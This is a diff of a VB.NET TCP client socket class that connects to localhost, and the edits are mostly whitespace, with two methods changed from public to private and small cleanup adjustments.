@@ -3,13 +3,19 @@
 Public Class ClientSocket
 
     Public Shared S As Socket
+
     Public Shared isConnected As Boolean = False
+
     Public Shared MS As MemoryStream
+
     Public Shared EOF As String = "<EOF>"
     Public Shared SPL As String = "<N>"
 
+
     Public Shared Sub Connect()
+
         Threading.Thread.Sleep(1000)
+
         S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
         Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
@@ -39,14 +45,16 @@ Public Class ClientSocket
 
     End Sub
 
-    Public Shared Sub Read()
+    Private Shared Sub Read()
 
         Dim i As Integer = 0
         Dim ii As Integer = 0
+
         While isConnected = True
 
             Try
                 Threading.Thread.Sleep(1)
+
                 i += 1
 
                 If i >= 500 Then
@@ -114,15 +122,14 @@ re:
             If S IsNot Nothing Then
                 S.Close()
                 S.Dispose()
-                S = Nothing
             End If
         Catch ex As Exception
         End Try
 
         Try
             If MS IsNot Nothing Then
+                MS.Flush()
                 MS.Dispose()
-                MS = Nothing
             End If
         Catch ex As Exception
         End Try
@@ -131,7 +138,7 @@ re:
 
     End Sub
 
-    Public Shared Sub Send(ByVal b As Byte())
+    Private Shared Sub Send(ByVal b As Byte())
         Dim M As MemoryStream = New IO.MemoryStream
         Try
             M.Write(b, 0, b.Length)
